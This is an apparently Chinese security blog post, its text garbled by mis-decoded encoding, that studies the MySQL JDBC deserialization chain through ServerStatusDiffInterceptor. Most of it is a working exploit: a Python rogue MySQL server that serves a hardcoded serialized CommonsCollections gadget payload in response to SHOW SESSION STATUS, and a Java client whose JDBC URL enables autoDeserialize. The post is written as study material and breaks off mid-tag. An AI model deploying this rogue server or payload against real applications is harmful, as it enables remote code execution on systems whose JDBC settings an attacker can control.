        <content type="html"><![CDATA[<p>æ¥å­¦ä¸€ä¸‹å¸¸è§çš„JDBCååºåˆ—åŒ–ï¼Œæ˜¯MYSQLçš„ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://tttang.com/archive/1877/">https://tttang.com/archive/1877/</a></p><h1 id="jdbcç®€å•ä»‹ç»"><a href="#JDBCç®€å•ä»‹ç»" class="headerlink" title="JDBCç®€å•ä»‹ç»"></a>JDBCç®€å•ä»‹ç»</h1><p>ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//åŠ è½½é©±åŠ¨</span><br>        Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>        <span class="hljs-comment">//å»ºç«‹è¿æ¥,å¯èƒ½è¦è®¾ç½®ä¸€ä¸‹æ—¶åŒºï¼Œå¯ä»¥è®¾ç½®ä¸ºä¸Šæµ·</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test?serverTimezone=Asia/Shanghai&amp;&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root123&quot;</span>);<br>        <span class="hljs-comment">//æ“ä½œæ•°æ®åº“æ‰§è¡Œå¢åˆ æ”¹æŸ¥</span><br>        <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br>        <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(<span class="hljs-string">&quot;select * from ceshi&quot;</span>);<br>        <span class="hljs-keyword">while</span> (resultSet.next()) &#123;<br>            System.out.println(resultSet.getString(<span class="hljs-string">&quot;name&quot;</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p>è‹¥æ”»å‡»è€…èƒ½æ§åˆ¶JDBCè¿æ¥è®¾ç½®é¡¹ï¼Œåˆ™å¯ä»¥é€šè¿‡è®¾ç½®å…¶é…ç½®æŒ‡å‘æ¶æ„MySQLæœåŠ¡å™¨è§¦å‘ObjectInputStream.readObject()ï¼Œæ„é€ ååºåˆ—åŒ–åˆ©ç”¨é“¾ä»è€Œé€ æˆRCEã€‚<br>é€šè¿‡JDBCè¿æ¥MySQLæœåŠ¡ç«¯æ—¶ï¼Œä¼šæœ‰å‡ å¥å†…ç½®çš„æŸ¥è¯¢è¯­å¥éœ€æ‰§è¡Œï¼Œå…¶ä¸­ä¸¤ä¸ªæŸ¥è¯¢çš„ç»“æœé›†åœ¨MySQLå®¢æˆ·ç«¯è¿›è¡Œå¤„ç†æ—¶ä¼šè¢«ObjectInputStream.readObject()è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶JDBCè¿æ¥è®¾ç½®é¡¹ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è®¾ç½®å…¶é…ç½®æŒ‡å‘æ¶æ„MySQLæœåŠ¡è§¦å‘MySQL JDBCå®¢æˆ·ç«¯çš„ååºåˆ—åŒ–æ¼æ´ã€‚<br>å¯è¢«åˆ©ç”¨çš„ä¸¤æ¡æŸ¥è¯¢è¯­å¥ï¼š</p><ul><li><p>SHOW SESSION STATUS</p><p>æ­¤è¯­å¥ç”¨äºæ˜¾ç¤ºå½“å‰ä¼šè¯çš„çŠ¶æ€ä¿¡æ¯ã€‚å®ƒæä¾›äº†ä¸€ç³»åˆ—å…³äºä¼šè¯çº§åˆ«çš„ç»Ÿè®¡ä¿¡æ¯å’Œå˜é‡çš„å€¼ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©å¼€å‘è€…å’Œæ•°æ®åº“ç®¡ç†å‘˜äº†è§£å½“å‰ä¼šè¯çš„æ€§èƒ½å’Œè¡Œä¸ºã€‚</p></li><li><p>SHOW COLLATION</p><p>æ­¤è¯­å¥ç”¨äºæ˜¾ç¤ºå½“å‰æ•°æ®åº“ä¸­å¯ç”¨çš„å­—ç¬¦é›†å’Œæ’åºè§„åˆ™ï¼ˆcollationï¼‰ã€‚æ’åºè§„åˆ™å®šä¹‰äº†å¦‚ä½•æ¯”è¾ƒå’Œæ’åºå­—ç¬¦ä¸²ã€‚</p></li></ul><h1 id="serverstatusdiffinterceptoråˆ©ç”¨é“¾"><a href="#ServerStatusDiffInterceptoråˆ©ç”¨é“¾" class="headerlink" title="ServerStatusDiffInterceptoråˆ©ç”¨é“¾"></a>ServerStatusDiffInterceptoråˆ©ç”¨é“¾</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/8159?time__1311=n4+xnD0Dc7GQDtY40KDsA3xCTTNrKhK3DgAmoD">https://xz.aliyun.com/t/8159?time__1311=n4%2BxnD0Dc7GQDtY40KDsA3xCTTNrKhK3DgAmoD</a></p><p>è¿™é‡Œçš„ç¯å¢ƒå¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ccæ˜¯ä¸ºäº†ç”¨æ¥è§¦å‘ååºåˆ—åŒ–çš„</p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>é¦–å…ˆæˆ‘ä»¬çš„ä»»åŠ¡å°±æ˜¯æ‰¾åŒ…å†…æœ‰å“ªä¸ªç±»çš„æ–¹æ³•é‡Œé¢æœ‰readObjectå‡½æ•°ï¼Œé“¾å­çš„ä½œè€…åœ¨æŒ–æ˜çš„æ—¶å€™å°±æ‰¾åˆ°äº†è¿™ä¸ªå…¥å£ç‚¹<strong>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</strong></p><p><img src="https://cdn.clown2024.cn/202410011740099.png" alt="image-20241001173957942"></p><p>è¿™é‡Œå°±å­˜åœ¨readObjectæ–¹æ³•ï¼Œé‚£å°±éœ€è¦åƒæ­£å¸¸æ‰¾é“¾å­ä¸€æ ·å¾€ä¸Šæ‰¾äº†</p><blockquote><p>è¿™é‡Œåªè¦æˆ‘ä»¬åœ¨jdbc urlä¸­è®¾ç½®autoDeserializeä¸ºtrueå°±å¯ä»¥è¿›å…¥åˆ°readObjecté‡Œé¢</p><p>-84å’Œ-19æ˜¯åºåˆ—åŒ–å¯¹è±¡çš„å‰ä¸¤ä¸ªå­—èŠ‚ï¼Œç”¨æ¥æ ‡è¯†æ•°æ®æ˜¯å¦ä¸ºåºåˆ—åŒ–å¯¹è±¡</p></blockquote><p><img src="https://cdn.clown2024.cn/202410012303198.png" alt="image-20241001230233251"></p><p>è¿™é‡Œå¯ä»¥æ‰¾åˆ°ResultSetUtilè¿™ä¸ªç±»çš„resultSetToMap</p><p>ç„¶åå†ç»§ç»­å¾€ä¸Šæ‰¾</p><p><img src="https://cdn.clown2024.cn/202410012304030.png" alt="image-20241001230435900"></p><p>æœ€ç»ˆå°±æ‰¾åˆ°äº†æˆ‘ä»¬çš„<strong>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</strong>æ–¹æ³•ï¼Œè¿™é‡Œæ‰§è¡Œäº†æˆ‘ä»¬çš„å‰é¢æåˆ°è¿‡çš„<strong>SHOW SESSION STATUS</strong>è¯­å¥ï¼Œç„¶åå°†è¿”å›çš„ç»“æœä¼ å…¥resultSetToMapæ–¹æ³•æ¥è°ƒç”¨</p><p>è¯¥ç±»æ˜¯ä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œåœ¨JDBC URLä¸­è®¾å®šå±æ€§queryInterceptorsä¸º<code>ServerStatusDiffInterceptor</code>æ—¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢è¯­å¥ä¼šè°ƒç”¨æ‹¦æˆªå™¨çš„preProcesså’ŒpostProcessæ–¹æ³•ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•é‡Œé¢éƒ½è°ƒç”¨äº†populateMapWithSessionStatusValuesæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410012317524.png" alt="image-20241001231725481"></p><p>è¿™æ ·å°±æ„æˆäº†æˆ‘ä»¬çš„è§¦å‘æ¡ä»¶äº†</p><p>é‚£æˆ‘ä»¬çš„æ”»å‡»æ€è·¯å°±æ˜¯ï¼Œè¦è®©<strong>SHOW SESSION STATUS</strong>è¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œæˆ‘ä»¬å°±éœ€è¦æ ¹æ®MySqlåè®®çš„æµé‡æ ¼å¼å»å†™ä¸€ä¸ªæ¶æ„çš„MySqlæœåŠ¡å™¨è®©å®¢æˆ·ç«¯è¿æ¥</p><p>æˆ‘ä»¬å¯ä»¥èµ·ä¸€ä¸ªmysqlçš„docekrå®¹å™¨ç„¶åå»æŠ“ä¸€ä¸‹æµé‡æ¥åˆ†æ</p><p><img src="https://cdn.clown2024.cn/202410012324338.png" alt="image-20241001232453239"></p><p>å°±ç”¨å‰é¢ç®€å•çš„ä¾‹å­æ‰§è¡Œä¸€ä¸‹æŠ“ä¸€ä¸‹è¿‡ç¨‹å³å¯ï¼Œå¦‚ä¸Šå›¾</p><blockquote><p>æŠ“æœ¬åœ°å›ç¯åŒ…éœ€è¦ä¸‹è½½npcapæ‰è¡Œ</p></blockquote><p>æ¯”å¦‚Response OK</p><p><img src="https://cdn.clown2024.cn/202410012329473.png" alt="image-20241001232901372"></p><p>æˆ‘ä»¬åªéœ€è¦è¿”å›è¿™äº›æ•°æ®å³å¯</p><p>æˆ‘ä»¬çš„æ”»å‡»è¿‡ç¨‹å°±æ˜¯ç…§æŠ„æµé‡åŒ…ï¼ŒæŒ‰ç…§è¿”å›çš„é¡ºåºè¿”å›ç»™å®¢æˆ·ç«¯å³å¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€æ¡SHOW SESSION STATUSçš„æŸ¥è¯¢è·Ÿç€ä¼ªé€ ä¸€ä¸‹</p><p>ç„¶åcopyä¸€ä¸‹æ–‡ç« æœ‰å…³ç»“æœé›†æ•°æ®åŒ…çš„ç»“æ„</p><p><img src="https://cdn.clown2024.cn/202410012333975.png" alt="image-20241001233303908"></p><ul><li>æ•°æ®æ®µ1ï¼šè¯´æ˜ä¸‹é¢çš„ç»“æœé›†æœ‰å¤šå°‘åˆ—</li><li>æ•°æ®æ®µ2ï¼šåˆ—çš„å®šä¹‰</li><li>æ•°æ®æ®µ3ï¼š EOF åŒ…</li><li>æ•°æ®æ®µ4ï¼šè¡Œæ•°æ®ã€‚</li></ul><h2 id="expç¼–å†™"><a href="#expç¼–å†™" class="headerlink" title="expç¼–å†™"></a>expç¼–å†™</h2><p>è¿™é‡Œå°±ç›´æ¥copyå¸ˆå‚…çš„pocäº†ï¼Œè¯»ä¸€è¯»ä»£ç å­¦ä¹ ä¸€ä¸‹</p><p>æ¶æ„mysqlæœåŠ¡</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment">#é—®å€™æ¶ˆæ¯</span><br>greeting_data=<span class="hljs-string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="hljs-comment">#å“åº”æ¶ˆæ¯</span><br>response_ok_data=<span class="hljs-string">&quot;0700000200000002000000&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_data</span>(<span class="hljs-params">conn</span>):<br>    data = conn.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data).lower()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_data</span>(<span class="hljs-params">conn,data</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    conn.send(binascii.a2b_hex(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_payload_content</span>():<br>    <span class="hljs-comment">#fileæ–‡ä»¶çš„å†…å®¹ä½¿ç”¨ysoserialç”Ÿæˆçš„ ä½¿ç”¨è§„åˆ™  java -jar ysoserial [common7é‚£ä¸ª]  &quot;calc&quot; &gt; a</span><br>    file= <span class="hljs-string">r&#x27;a&#x27;</span><br>    <span class="hljs-keyword">if</span> os.path.isfile(file):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            payload_content = <span class="hljs-built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open successs&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open false&quot;</span>)<br>        <span class="hljs-comment">#calc</span><br>        payload_content=<span class="hljs-string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span><br>    <span class="hljs-keyword">return</span> payload_content<br><br><span class="hljs-comment"># ä¸»è¦é€»è¾‘</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        conn, addr = sk.accept()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr[<span class="hljs-number">0</span>],addr[<span class="hljs-number">1</span>]))<br><br>        <span class="hljs-comment"># 1.å…ˆå‘é€ç¬¬ä¸€ä¸ª é—®å€™æŠ¥æ–‡</span><br>        send_data(conn,greeting_data)<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># ç™»å½•è®¤è¯è¿‡ç¨‹æ¨¡æ‹Ÿ  1.å®¢æˆ·ç«¯å‘é€request loginæŠ¥æ–‡ 2.æœåŠ¡ç«¯å“åº”response_ok</span><br>            receive_data(conn)<br>            send_data(conn,response_ok_data)<br><br>            <span class="hljs-comment">#å…¶ä»–è¿‡ç¨‹</span><br>            data=receive_data(conn)<br>            <span class="hljs-comment">#æŸ¥è¯¢ä¸€äº›é…ç½®ä¿¡æ¯,å…¶ä¸­ä¼šå‘é€è‡ªå·±çš„ ç‰ˆæœ¬å·</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session.auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload=<span class="hljs-string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span><br>                send_data(conn,_payload)<br>                data=receive_data(conn)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span><br>                send_data(conn, _payload)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set names&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set character_set_results&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show session status&quot;</span> <span class="hljs-keyword">in</span> data:<br>                mysql_data = <span class="hljs-string">&#x27;0100000102&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                <span class="hljs-comment"># ä¸ºä»€ä¹ˆæˆ‘åŠ äº†EOF Packet å°±æ— æ³•æ­£å¸¸è¿è¡Œå‘¢ï¼Ÿï¼Ÿ</span><br>                <span class="hljs-comment">#è·å–payload</span><br>                payload_content=get_payload_content()<br>                <span class="hljs-comment">#è®¡ç®—payloadé•¿åº¦</span><br>                payload_length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">4</span>)<br>                payload_length_hex = payload_length[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + payload_length[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                <span class="hljs-comment">#è®¡ç®—æ•°æ®åŒ…é•¿åº¦</span><br>                data_len = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span> + <span class="hljs-number">4</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">6</span>)<br>                data_len_hex = data_len[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] + data_len[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + data_len[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                mysql_data += data_len_hex + <span class="hljs-string">&#x27;04&#x27;</span> + <span class="hljs-string">&#x27;fbfc&#x27;</span>+ payload_length_hex<br>                mysql_data += <span class="hljs-built_in">str</span>(payload_content)<br>                mysql_data += <span class="hljs-string">&#x27;07000005fe000022000100&#x27;</span><br>                send_data(conn, mysql_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span><br>                send_data(conn, payload)<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    HOST =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>    PORT = <span class="hljs-number">3309</span><br><br>    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <span class="hljs-comment">#å½“socketå…³é—­åï¼Œæœ¬åœ°ç«¯ç”¨äºè¯¥socketçš„ç«¯å£å·ç«‹åˆ»å°±å¯ä»¥è¢«é‡ç”¨.ä¸ºäº†å®éªŒçš„æ—¶å€™ä¸ç”¨ç­‰å¾…å¾ˆé•¿æ—¶é—´</span><br>    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    sk.bind((HOST, PORT))<br>    sk.listen(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST,PORT))<br><br>    run()<br></code></pre></td></tr></table></figure><p>Client</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ServerStatusDiffInterceptor;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">driver</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">DB_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span>;<span class="hljs-comment">//8.xä½¿ç”¨</span><br>        Class.forName(driver);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(DB_URL);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åç”Ÿæˆä¸€ä¸ªcc7çš„payloadæ–‡ä»¶æ”¾åœ¨pocçš„ç›®å½•ä¸‹</p><blockquote><p>å§æ§½è¿™æœ‰ä¸ªå¥‡æ€ªçš„å‘ï¼Œysoserialç”Ÿæˆpayloadçš„æ—¶å€™å‘½ä»¤ä¸èƒ½ç”¨å¼•å·æ‹¬èµ·æ¥ï¼Œä¸ç„¶å°±æŠ¥é”™äº†ï¼Œåæ­£æˆ‘æ˜¯è¿™æ ·çš„ï¼ˆåº”è¯¥æ˜¯ä¸èƒ½å•å¼•å·ï¼ŒåŒå¼•å·æ˜¯å¯ä»¥çš„</p></blockquote><p>æ‰§è¡Œæ•ˆæœ</p><p><img src="https://cdn.clown2024.cn/202410012339938.png" alt="image-20241001233903839"></p><p><img src="https://cdn.clown2024.cn/202410012339163.png" alt="image-20241001233926085"></p><p>ç„¶å8.0.20ä¹‹åä¸å†è°ƒç”¨resultSetToMapæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ä¸å†è°ƒç”¨getObjectæ–¹æ³•äº†ï¼Œæ‰€ä»¥è¿™æ¡é“¾ä¹Ÿå°±æ‰“ä¸é€šäº†</p><h2 id="å…¶ä»–ç‰ˆæœ¬"><a href="#å…¶ä»–ç‰ˆæœ¬" class="headerlink" 